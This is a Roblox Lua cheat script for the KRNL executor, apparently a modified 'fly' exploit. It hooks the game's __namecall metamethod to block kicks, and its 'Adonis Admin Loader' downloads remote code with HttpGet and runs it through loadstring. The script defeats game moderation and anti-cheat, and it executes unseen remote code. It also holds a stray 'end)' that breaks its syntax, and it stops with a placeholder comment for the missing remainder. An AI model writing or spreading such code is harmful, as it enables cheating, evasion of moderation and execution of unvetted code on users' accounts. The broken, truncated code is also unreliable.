-- GREG'S ULTIMATE FLY SCRIPT FOR KRNL
-- Cleaned up, platform-aware, mobile dismiss/reactivate, PC toggle, effects, and Adonis Loader

local player = game.Players.LocalPlayer
local uis = game:GetService("UserInputService")
local rs = game:GetService("RunService")
local mt = getrawmetatable(game)
setreadonly(mt, false)
local oldNamecall = mt.__namecall

-- Anti-Kick Hook
mt.__namecall = newcclosure(function(self, ...)
	local args = {...}
	local method = getnamecallmethod()
	if method == "Kick" or tostring(self) == "Kick" then
		warn("[GREG ANTI-KICK] Blocked kick attempt!")
		return nil
	end
	return oldNamecall(self, unpack(args))
end)

-- Adonis Admin Loader
pcall(function()
	loadstring(game:HttpGet("https://www.roblox.com/asset/?id=7510622625"))()
end)
end)

local speed = 50
local flying = false
local activeFly = nil

-- GUI
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
local box = Instance.new("TextLabel")
box.Size = UDim2.new(0, 360, 0, 80)
box.Position = UDim2.new(0.5, -180, 0.05, 0)
box.Text = "[GREG FLY ENABLED]\n• Press E to toggle Fly (PC)\n• Use Joystick (Mobile)\n• You are UNKICKABLE :)"
box.TextColor3 = Color3.new(1, 1, 1)
box.TextScaled = true
box.BackgroundColor3 = Color3.fromRGB(30,30,30)
box.Font = Enum.Font.GothamBold
box.Parent = gui

-- Sound + Particle Feedback
local function announceFly()
	local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	local sfx = Instance.new("Sound")
	sfx.SoundId = "rbxassetid://136274352281439"
	sfx.Volume = 5
	sfx.PlayOnRemove = true
	sfx.Parent = hrp
	sfx:Destroy()

	local particle = Instance.new("ParticleEmitter")
	particle.Texture = "rbxassetid://301055640"
	particle.Rate = 200
	particle.Lifetime = NumberRange.new(0.5)
	particle.Speed = NumberRange.new(10)
	particle.Parent = hrp
	game.Debris:AddItem(particle, 1)
end

-- [rest of the original script continues below unchanged...]
